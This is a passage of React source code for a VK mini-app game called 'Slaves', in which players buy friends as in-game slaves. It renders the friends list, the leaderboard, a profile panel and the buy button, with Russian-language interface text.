                                            <div className='flex' style={{width: '100%'}}>
                                                <SimpleButton
                                                    onClick={() => {
                                                        bridge.send('VKWebAppCopyText', {text: `vk.com/app${this.vkParams().vk_app_id}#${user.id}`});
                                                        this.setState({
                                                            snackbar:
                                                                <Snackbar
                                                                    onClose={() => this.setState({snackbar: null})}>
                                                                    Ссылка скопирована
                                                                </Snackbar>
                                                        });
                                                    }}
                                                    style={{
                                                        color: 'rgba(0, 0, 0, 0.8)',
                                                        background: '#F2F4F5',
                                                        borderRadius: 10
                                                    }}>Скопировать</SimpleButton>
                                                <div style={{width: 6}}/>
                                                <SimpleButton
                                                    onClick={() => {
                                                        this.setState({
                                                            popout:
                                                                <ActionSheet
                                                                    onClose={() => this.setState({popout: null})}
                                                                    iosCloseItem={<ActionSheetItem autoclose
                                                                                                   mode='cancel'>Отменить</ActionSheetItem>}
                                                                >
                                                                    <ActionSheetItem
                                                                        onClick={() => {
                                                                            this.shareStory();
                                                                        }} autoclose before={<Icon28StoryOutline/>}>
                                                                        Опубликовать историю
                                                                    </ActionSheetItem>
                                                                    <ActionSheetItem
                                                                        onClick={async () => {
                                                                            this.setState({popout: <ScreenSpinner/>});
                                                                            const canvas = await this.getStoryCanvas();
                                                                            if (this.state.token_wall) {
                                                                                canvas.toBlob(async function (blob) {
                                                                                    this.uploadStoryPhotoToWall(blob);
                                                                                }.bind(this));
                                                                            }
                                                                            this.setState({popout: null});
                                                                        }}
                                                                        autoclose before={
                                                                        <Icon28WriteSquareOutline/>}>
                                                                        Опубликовать запись
                                                                    </ActionSheetItem>
                                                                </ActionSheet>
                                                        });
                                                    }}
                                                    style={{
                                                        borderRadius: 10
                                                    }}>Поделиться</SimpleButton>
                                            </div>
                                            <div style={{height: 12}}/>
                                            <Search style={{padding: 0}} value={this.state.search_value}
                                                    onChange={value =>
                                                        this.setState({search_value: value.currentTarget.value})
                                                    }/>
                                            <div style={{height: 12}}/>
                                            {friends.map((value, i) => {
                                                    const friend = local_users[value.id];
                                                    return value.owner !== user.id && (this.state.search_value ? `${friend.first_name} ${friend.last_name}`.toLowerCase().startsWith(this.state.search_value.toLowerCase()) : true) &&
                                                        <div>
                                                            <div className='flex' style={{alignItems: 'center'}}
                                                                 onClick={async () => {
                                                                     this.openProfile(value.id);
                                                                 }}>
                                                                <Avatar src={friend.photo_200} size={44}/>
                                                                <div style={{width: 8}}/>
                                                                <div className='flex'
                                                                     style={{width: '100%'}}>
                                                                    <div style={{width: '70%'}}>
                                                                        <div className='FriendName'>
                                                                            {friend.first_name} {friend.last_name}
                                                                        </div>
                                                                        <div style={{height: 4}}/>
                                                                        <div className='FriendStatus'
                                                                             style={{
                                                                                 color: value.owner > 0 ? '#CC5250' : '#42BC7F'
                                                                             }}>
                                                                            {
                                                                                value.owner > 0 ?
                                                                                    `В рабстве у ${local_users[value.owner].first_name_gen} ${local_users[value.owner].last_name_gen}`
                                                                                    :
                                                                                    'Свободен'
                                                                            }
                                                                        </div>
                                                                    </div>
                                                                    <span
                                                                        className='FriendPrice'>{shortIntegers(value.owner > 0 ? (value.price * 2.13).toFixed(2) : value.price)} ₽</span>
                                                                </div>
                                                            </div>
                                                            <div style={{height: 4}}/>
                                                        </div>;
                                                }
                                            )}
                                        </div>
                                        {snackbar}
                                    </Panel>
                                </View>
                                <View id='rate' activePanel={activePanel[activeStory].toString()}>
                                    <Panel id='rate'>
                                        <PanelHeader
                                            separator={false}
                                        >
                                            Рейтинг
                                        </PanelHeader>
                                        <LeaderBoard
                                            tabs={['Все', 'Друзья']} users={state.top}
                                            onClick={async (tab, value, i) => {
                                                this.openProfile(value.id);
                                            }}/>
                                    </Panel>
                                    <Panel id='info'>
                                        <PanelHeader
                                            left={<PanelHeaderBack onClick={() => this.back()}/>}
                                            separator={false}
                                        >
                                            Профиль
                                        </PanelHeader>
                                        <div className='centered'>
                                            <Avatar src={slave_info.photo_200} size={80}/>
                                        </div>
                                        <div style={{height: 16}}/>
                                        <div
                                            className='ProfileTitle'>{slave_info.first_name} {slave_info.last_name}</div>
                                        <div style={{height: 16}}/>
                                        <div style={{
                                            margin: '0 21px',
                                            paddingBottom: slave_info.owner === 0 ? 56 : 24
                                        }}>
                                            <SimpleBanner
                                                icon={<Icon28InfoCircleOutline width={24} height={24} fill='#5AB9E5'/>}
                                                text='Купив раба, вы получаете 50% его дохода, пока он не выкупится.'/>
                                            <div style={{height: 12}}/>
                                            <div className='SimpleCard centered'>
                                                <div className='SimpleCard_Title' style={{textAlign: 'center'}}>
                                                    Статус
                                                </div>
                                                <div style={{height: 6}}/>
                                                <div className='SimpleCard_MiniSubTitle' onClick={async () => {
                                                    if (slave_info.owner > 0) {
                                                        this.openProfile(slave_info.owner);
                                                    }
                                                }}>
                                                    {
                                                        slave_info.slaves.length >= 200 ? 'Очень влиятельный работорговец' :
                                                            slave_info.slaves.length >= 100 ? 'Успешный работорговец' :
                                                                slave_info.slaves.length >= 30 ? 'Состоятельный работорговец' :
                                                                    profile.slaves.length >= 1 ? 'Работорговец новичок'
                                                                        : 'Работорговец неудачник'}. {slave_info.owner > 0 ? `В рабстве у ${local_users[slave_info.owner].first_name_gen} ${local_users[slave_info.owner].last_name_gen}` : 'На свободе'}.
                                                </div>
                                            </div>
                                            <div style={{height: 12}}/>
                                            {
                                                slave_info.job &&
                                                <React.Fragment>
                                                    <div className='SimpleCard'>
                                                        <div className='SimpleCard_Title'>
                                                            Работа: <span style={{fontFamily: 'SF Pro Text'}}>
                                                            {jobs[slave_info.job]}</span>
                                                        </div>
                                                    </div>
                                                    <div style={{height: 12}}/>
                                                </React.Fragment>
                                            }
                                            <div className='SimpleCard'>
                                                <div className='SimpleCard_Title'>Баланс</div>
                                                <div style={{height: 6}}/>
                                                <div className='SimpleCard_SubTitle'>
                                                    {shortIntegers(slave_info.balance)} ₽
                                                </div>
                                            </div>
                                            <div style={{height: 12}}/>
                                            <div className='SimpleCard'>
                                                <div className='flex'>
                                                    <div className='SimpleCard_Title'>
                                                        Рабы: <span
                                                        style={{color: 'rgba(0, 0, 0, 0.35)'}}>{slave_info.slaves.length}</span>
                                                    </div>
                                                    <span className='SimpleCard_Title'
                                                          style={{
                                                              color: 'rgba(0, 0, 0, 0.35)',
                                                              textAlign: 'right',
                                                              width: '80%'
                                                          }}>
                                                     {(slave_info.slaves.length * 0.1).toFixed(2)} ₽/мин
                                                     </span>
                                                </div>
                                                <div style={{height: 12}}/>
                                                {
                                                    slave_info.slaves.length > 0 &&
                                                    <React.Fragment>
                                                        <div style={{height: 12}}/>
                                                        {slave_info.slaves.map((value, i) => {
                                                                const slave = local_users[value];
                                                                return <div onClick={() => {
                                                                    this.openProfile(value);
                                                                }}>
                                                                    <div className='flex' style={{alignItems: 'center'}}>
                                                                        <Avatar src={slave.photo_200} size={24}/>
                                                                        <div style={{width: 8}}/>
                                                                        <div className='flex'
                                                                             style={{width: '100%', marginRight: 7}}>
                                                                            <span
                                                                                className='SlaveName'>{slave.first_name} {slave.last_name}</span>
                                                                        </div>
                                                                    </div>
                                                                    <div style={{height: 4}}/>
                                                                </div>;
                                                            }
                                                        )}
                                                    </React.Fragment>
                                                }
                                            </div>
                                        </div>
                                        {
                                            slave_info.id != profile.id && slave_info.owner != profile.id &&
                                            <div style={{
                                                position: 'fixed',
                                                bottom: 60,
                                                zIndex: 10,
                                                left: 12,
                                                right: 12
                                            }}>
                                                <SimpleButton onClick={async () => {
                                                    this.setState({popout: <ScreenSpinner/>});
                                                    const success = await this.apiRequest('slaves.buy', {slave_id: slave_info.id});
                                                    if (success === true) {
                                                        let {slave_info} = this.state;
                                                        slave_info.owner = profile.id;
                                                        this.setState({slave_info});
                                                        this.updateShop();
                                                    } else {
                                                        this.setState({
                                                            snackbar:
                                                                <Snackbar
                                                                    onClose={() => this.setState({snackbar: null})}>
                                                                    Недостаточно средств
                                                                </Snackbar>
                                                        });
                                                    }
                                                    this.setState({popout: null});
                                                }} style={{
                                                    borderRadius: 10.5
                                                }}>
                                                    Купить
                                                    за {shortIntegers(slave_info.owner > 0 ? (slave_info.price * 2.13).toFixed(2) : slave_info.price)} ₽
                                                </SimpleButton>
                                            </div>
                                        }
                                        {this.state.snackbar}
                                    </Panel>
                                </View>
                            </Epic>
                        </Panel>
                    </View>
                </Root>
            </AppRoot>
        );
    }
}

export default Slaves;